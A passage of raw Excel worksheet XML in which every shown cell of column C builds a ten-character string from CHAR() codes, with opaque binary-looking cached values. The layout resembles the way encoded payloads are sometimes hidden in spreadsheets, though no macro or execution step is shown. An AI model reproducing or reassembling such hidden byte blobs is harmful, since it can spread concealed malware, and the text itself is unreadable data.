        <f>CHAR(138)&amp;CHAR(210)&amp;CHAR(196)&amp;CHAR(201)&amp;CHAR(145)&amp;CHAR(6)&amp;CHAR(245)&amp;CHAR(210)&amp;CHAR(174)&amp;CHAR(234)</f>
        <v>ŠÒÄÉ‘_x0006_õÒ®ê</v>
      </c>
    </row>
    <row r="774" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C774" t="str">
        <f>CHAR(163)&amp;CHAR(255)&amp;CHAR(228)&amp;CHAR(101)&amp;CHAR(166)&amp;CHAR(130)&amp;CHAR(203)&amp;CHAR(189)&amp;CHAR(146)&amp;CHAR(143)</f>
        <v>£ÿäe¦‚Ë½’</v>
      </c>
    </row>
    <row r="775" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C775" t="str">
        <f>CHAR(157)&amp;CHAR(80)&amp;CHAR(164)&amp;CHAR(136)&amp;CHAR(218)&amp;CHAR(159)&amp;CHAR(158)&amp;CHAR(146)&amp;CHAR(154)&amp;CHAR(55)</f>
        <v>P¤ˆÚŸž’š7</v>
      </c>
    </row>
    <row r="776" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C776" t="str">
        <f>CHAR(197)&amp;CHAR(92)&amp;CHAR(193)&amp;CHAR(183)&amp;CHAR(161)&amp;CHAR(228)&amp;CHAR(192)&amp;CHAR(214)&amp;CHAR(68)&amp;CHAR(235)</f>
        <v>Å\Á·¡äÀÖDë</v>
      </c>
    </row>
    <row r="777" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C777" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="778" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C778" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(174)&amp;CHAR(255)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô®ÿë»ë÷ý</v>
      </c>
    </row>
    <row r="779" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C779" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(85)&amp;CHAR(197)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»UÅýô6</v>
      </c>
    </row>
    <row r="780" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C780" t="str">
        <f>CHAR(237)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="781" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C781" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="782" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C782" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(134)&amp;CHAR(255)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô†ÿë»ë÷ý</v>
      </c>
    </row>
    <row r="783" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C783" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="784" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C784" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(180)</f>
        <v>Íë»ë÷ýô6Í´</v>
      </c>
    </row>
    <row r="785" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C785" t="str">
        <f>CHAR(248)&amp;CHAR(132)&amp;CHAR(133)&amp;CHAR(184)&amp;CHAR(140)&amp;CHAR(83)&amp;CHAR(128)&amp;CHAR(138)&amp;CHAR(210)&amp;CHAR(133)</f>
        <v>ø„…¸ŒS€ŠÒ…</v>
      </c>
    </row>
    <row r="786" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C786" t="str">
        <f>CHAR(247)&amp;CHAR(144)&amp;CHAR(135)&amp;CHAR(85)&amp;CHAR(162)&amp;CHAR(153)&amp;CHAR(222)&amp;CHAR(142)&amp;CHAR(217)&amp;CHAR(153)</f>
        <v>÷‡U¢™ÞŽÙ™</v>
      </c>
    </row>
    <row r="787" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C787" t="str">
        <f>CHAR(152)&amp;CHAR(90)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(181)&amp;CHAR(85)&amp;CHAR(54)</f>
        <v>˜ZÍë»ë÷µU6</v>
      </c>
    </row>
    <row r="788" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C788" t="str">
        <f>CHAR(237)&amp;CHAR(171)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(201)&amp;CHAR(45)&amp;CHAR(235)</f>
        <v>í«»ë÷ýôÉ-ë</v>
      </c>
    </row>
    <row r="789" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C789" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="790" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C790" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="791" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C791" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="792" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C792" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="793" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C793" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="794" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C794" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="795" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C795" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="796" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C796" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="797" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C797" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="798" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C798" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="799" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C799" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="800" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C800" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="801" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C801" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="802" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C802" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="803" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C803" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="804" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C804" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="805" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C805" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="806" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C806" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="807" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C807" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="808" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C808" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="809" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C809" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="810" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C810" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="811" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C811" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="812" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C812" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="813" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C813" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="814" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C814" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ýô6Íë»ë÷ý</v>
      </c>
    </row>
    <row r="815" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C815" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6Íë»ë÷ýô6</v>
      </c>
    </row>
    <row r="816" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C816" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Íë»ë÷ýô6Íë</v>
      </c>
    </row>
    <row r="817" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C817" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)</f>
        <v>»ë÷ýô6Íë»ë</v>
      </c>
    </row>
    <row r="818" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C818" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(202)&amp;CHAR(37)&amp;CHAR(100)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(157)</f>
        <v>÷ýôÊ%d»ë÷</v>
      </c>
    </row>
    <row r="819" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C819" t="str">
        <f>CHAR(125)&amp;CHAR(211)&amp;CHAR(252)&amp;CHAR(57)&amp;CHAR(223)&amp;CHAR(96)&amp;CHAR(165)&amp;CHAR(205)&amp;CHAR(127)&amp;CHAR(100)</f>
        <v>}Óü9ß`¥Íd</v>
      </c>
    </row>
    <row r="820" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C820" t="str">
        <f>CHAR(193)&amp;CHAR(96)&amp;CHAR(233)&amp;CHAR(255)&amp;CHAR(124)&amp;CHAR(143)&amp;CHAR(220)&amp;CHAR(7)&amp;CHAR(50)&amp;CHAR(228)</f>
        <v>Á`éÿ|Ü_x0007_2ä</v>
      </c>
    </row>
    <row r="821" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C821" t="str">
        <f>CHAR(12)&amp;CHAR(161)&amp;CHAR(209)&amp;CHAR(204)&amp;CHAR(52)&amp;CHAR(154)&amp;CHAR(241)&amp;CHAR(138)&amp;CHAR(199)&amp;CHAR(233)</f>
        <v>_x000C_¡ÑÌ4šñŠÇé</v>
      </c>
    </row>
    <row r="822" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C822" t="str">
        <f>CHAR(219)&amp;CHAR(221)&amp;CHAR(53)&amp;CHAR(249)&amp;CHAR(192)&amp;CHAR(234)&amp;CHAR(124)&amp;CHAR(162)&amp;CHAR(130)&amp;CHAR(18)</f>
        <v>ÛÝ5ùÀê|¢‚_x0012_</v>
      </c>
    </row>
    <row r="823" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C823" t="str">
        <f>CHAR(166)&amp;CHAR(97)&amp;CHAR(70)&amp;CHAR(185)&amp;CHAR(171)&amp;CHAR(96)&amp;CHAR(181)&amp;CHAR(193)&amp;CHAR(245)&amp;CHAR(230)</f>
        <v>¦aF¹«`µÁõæ</v>
      </c>
    </row>
    <row r="824" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C824" t="str">
        <f>CHAR(70)&amp;CHAR(171)&amp;CHAR(195)&amp;CHAR(110)&amp;CHAR(55)&amp;CHAR(137)&amp;CHAR(184)&amp;CHAR(55)&amp;CHAR(29)&amp;CHAR(96)</f>
        <v>F«Ãn7‰¸7_x001D_`</v>
      </c>
    </row>
    <row r="825" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C825" t="str">
        <f>CHAR(227)&amp;CHAR(203)&amp;CHAR(246)&amp;CHAR(46)&amp;CHAR(127)&amp;CHAR(126)&amp;CHAR(213)&amp;CHAR(187)&amp;CHAR(62)&amp;CHAR(34)</f>
        <v>ãËö.~Õ»&gt;"</v>
      </c>
    </row>
    <row r="826" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C826" t="str">
        <f>CHAR(131)&amp;CHAR(193)&amp;CHAR(189)&amp;CHAR(189)&amp;CHAR(249)&amp;CHAR(96)&amp;CHAR(186)&amp;CHAR(61)&amp;CHAR(198)&amp;CHAR(2)</f>
        <v>ƒÁ½½ù`º=Æ_x0002_</v>
      </c>
    </row>
    <row r="827" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C827" t="str">
        <f>CHAR(197)&amp;CHAR(246)&amp;CHAR(97)&amp;CHAR(42)&amp;CHAR(116)&amp;CHAR(230)&amp;CHAR(246)&amp;CHAR(58)&amp;CHAR(204)&amp;CHAR(214)</f>
        <v>Åöa*tæö:ÌÖ</v>
      </c>
    </row>
    <row r="828" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C828" t="str">
        <f>CHAR(184)&amp;CHAR(31)&amp;CHAR(184)&amp;CHAR(150)&amp;CHAR(15)&amp;CHAR(198)&amp;CHAR(137)&amp;CHAR(18)&amp;CHAR(184)&amp;CHAR(11)</f>
        <v>¸_x001F_¸–_x000F_Æ‰_x0012_¸_x000B_</v>
      </c>
    </row>
    <row r="829" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C829" t="str">
        <f>CHAR(227)&amp;CHAR(96)&amp;CHAR(175)&amp;CHAR(217)&amp;CHAR(245)&amp;CHAR(229)&amp;CHAR(171)&amp;CHAR(96)&amp;CHAR(183)&amp;CHAR(160)</f>
        <v>ã`¯Ùõå«`· </v>
      </c>
    </row>
    <row r="830" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C830" t="str">
        <f>CHAR(124)&amp;CHAR(165)&amp;CHAR(232)&amp;CHAR(55)&amp;CHAR(30)&amp;CHAR(96)&amp;CHAR(191)&amp;CHAR(96)&amp;CHAR(246)&amp;CHAR(45)</f>
        <v>|¥è7_x001E_`¿`ö-</v>
      </c>
    </row>
    <row r="831" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C831" t="str">
        <f>CHAR(125)&amp;CHAR(114)&amp;CHAR(233)&amp;CHAR(207)&amp;CHAR(224)&amp;CHAR(176)&amp;CHAR(150)&amp;CHAR(164)&amp;CHAR(174)&amp;CHAR(103)</f>
        <v>}réÏà°–¤®g</v>
      </c>
    </row>
    <row r="832" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C832" t="str">
        <f>CHAR(50)&amp;CHAR(11)&amp;CHAR(227)&amp;CHAR(180)&amp;CHAR(173)&amp;CHAR(118)&amp;CHAR(230)&amp;CHAR(223)&amp;CHAR(77)&amp;CHAR(20)</f>
        <v>2_x000B_ã´­væßM_x0014_</v>
      </c>
    </row>
    <row r="833" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C833" t="str">
        <f>CHAR(68)&amp;CHAR(20)&amp;CHAR(170)&amp;CHAR(149)&amp;CHAR(199)&amp;CHAR(4)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(211)&amp;CHAR(156)</f>
        <v>D_x0014_ª•Ç_x0004_ÍëÓœ</v>
      </c>
    </row>
    <row r="834" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C834" t="str">
        <f>CHAR(132)&amp;CHAR(207)&amp;CHAR(171)&amp;CHAR(98)&amp;CHAR(165)&amp;CHAR(167)&amp;CHAR(204)&amp;CHAR(205)&amp;CHAR(240)&amp;CHAR(116)</f>
        <v>„Ï«b¥§ÌÍðt</v>
      </c>
    </row>
    <row r="835" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C835" t="str">
        <f>CHAR(28)&amp;CHAR(201)&amp;CHAR(29)&amp;CHAR(83)&amp;CHAR(43)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(221)&amp;CHAR(242)</f>
        <v>_x001C_É_x001D_S+ê÷ýÝò</v>
      </c>
    </row>
    <row r="836" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C836" t="str">
        <f>CHAR(153)&amp;CHAR(187)&amp;CHAR(211)&amp;CHAR(194)&amp;CHAR(119)&amp;CHAR(150)&amp;CHAR(244)&amp;CHAR(201)&amp;CHAR(24)&amp;CHAR(129)</f>
        <v>™»ÓÂw–ôÉ_x0018_</v>
      </c>
    </row>
    <row r="837" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C837" t="str">
        <f>CHAR(177)&amp;CHAR(131)&amp;CHAR(55)&amp;CHAR(85)&amp;CHAR(142)&amp;CHAR(214)&amp;CHAR(165)&amp;CHAR(233)&amp;CHAR(187)&amp;CHAR(238)</f>
        <v>±ƒ7UŽÖ¥é»î</v>
      </c>
    </row>
    <row r="838" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C838" t="str">
        <f>CHAR(206)&amp;CHAR(116)&amp;CHAR(18)&amp;CHAR(102)&amp;CHAR(157)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(171)&amp;CHAR(167)&amp;CHAR(189)</f>
        <v>Ît_x0012_f»ë«§½</v>
      </c>
    </row>
    <row r="839" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C839" t="str">
        <f>CHAR(164)&amp;CHAR(94)&amp;CHAR(39)&amp;CHAR(228)&amp;CHAR(100)&amp;CHAR(11)&amp;CHAR(8)&amp;CHAR(40)&amp;CHAR(99)&amp;CHAR(92)</f>
        <v>¤^'äd_x000B__x0008_(c\</v>
      </c>
    </row>
    <row r="840" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C840" t="str">
        <f>CHAR(221)&amp;CHAR(189)&amp;CHAR(236)&amp;CHAR(131)&amp;CHAR(110)&amp;CHAR(88)&amp;CHAR(128)&amp;CHAR(87)&amp;CHAR(50)&amp;CHAR(62)</f>
        <v>Ý½ìƒnX€W2&gt;</v>
      </c>
    </row>
    <row r="841" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C841" t="str">
        <f>CHAR(62)&amp;CHAR(43)&amp;CHAR(131)&amp;CHAR(247)&amp;CHAR(11)&amp;CHAR(120)&amp;CHAR(197)&amp;CHAR(158)&amp;CHAR(87)&amp;CHAR(3)</f>
        <v>&gt;+ƒ÷_x000B_xÅžW_x0003_</v>
      </c>
    </row>
    <row r="842" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C842" t="str">
        <f>CHAR(144)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(167)&amp;CHAR(235)&amp;CHAR(209)&amp;CHAR(239)&amp;CHAR(161)&amp;CHAR(170)</f>
        <v>ýô6§ëÑï¡ª</v>
      </c>
    </row>
    <row r="843" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C843" t="str">
        <f>CHAR(156)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(35)&amp;CHAR(228)&amp;CHAR(20)&amp;CHAR(34)&amp;CHAR(126)&amp;CHAR(12)&amp;CHAR(54)</f>
        <v>œ4_x0014_#ä_x0014_"~_x000C_6</v>
      </c>
    </row>
    <row r="844" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C844" t="str">
        <f>CHAR(179)&amp;CHAR(221)&amp;CHAR(48)&amp;CHAR(221)&amp;CHAR(157)&amp;CHAR(189)&amp;CHAR(156)&amp;CHAR(54)&amp;CHAR(221)&amp;CHAR(235)</f>
        <v>³Ý0Ý½œ6Ýë</v>
      </c>
    </row>
    <row r="845" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C845" t="str">
        <f>CHAR(187)&amp;CHAR(189)&amp;CHAR(157)&amp;CHAR(253)&amp;CHAR(156)&amp;CHAR(110)&amp;CHAR(105)&amp;CHAR(184)&amp;CHAR(94)&amp;CHAR(20)</f>
        <v>»½ýœni¸^_x0014_</v>
      </c>
    </row>
    <row r="846" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C846" t="str">
        <f>CHAR(34)&amp;CHAR(110)&amp;CHAR(167)&amp;CHAR(92)&amp;CHAR(205)&amp;CHAR(189)&amp;CHAR(232)&amp;CHAR(188)&amp;CHAR(159)&amp;CHAR(255)</f>
        <v>"n§\Í½è¼Ÿÿ</v>
      </c>
    </row>
    <row r="847" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C847" t="str">
        <f>CHAR(45)&amp;CHAR(254)&amp;CHAR(146)&amp;CHAR(20)&amp;CHAR(110)&amp;CHAR(104)&amp;CHAR(15)&amp;CHAR(253)&amp;CHAR(137)&amp;CHAR(30)</f>
        <v>-þ’_x0014_nh_x000F_ý‰_x001E_</v>
      </c>
    </row>
    <row r="848" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C848" t="str">
        <f>CHAR(149)&amp;CHAR(131)&amp;CHAR(187)&amp;CHAR(171)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(158)&amp;CHAR(54)&amp;CHAR(157)&amp;CHAR(131)</f>
        <v>•ƒ»«÷ýž6ƒ</v>
      </c>
    </row>
    <row r="849" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C849" t="str">
        <f>CHAR(176)&amp;CHAR(196)&amp;CHAR(248)&amp;CHAR(205)&amp;CHAR(11)&amp;CHAR(227)&amp;CHAR(154)&amp;CHAR(131)&amp;CHAR(206)&amp;CHAR(133)</f>
        <v>°ÄøÍ_x000B_ãšƒÎ…</v>
      </c>
    </row>
    <row r="850" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C850" t="str">
        <f>CHAR(186)&amp;CHAR(156)&amp;CHAR(11)&amp;CHAR(227)&amp;CHAR(147)&amp;CHAR(181)&amp;CHAR(68)&amp;CHAR(231)&amp;CHAR(211)&amp;CHAR(242)</f>
        <v>ºœ_x000B_ã“µDçÓò</v>
      </c>
    </row>
    <row r="851" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C851" t="str">
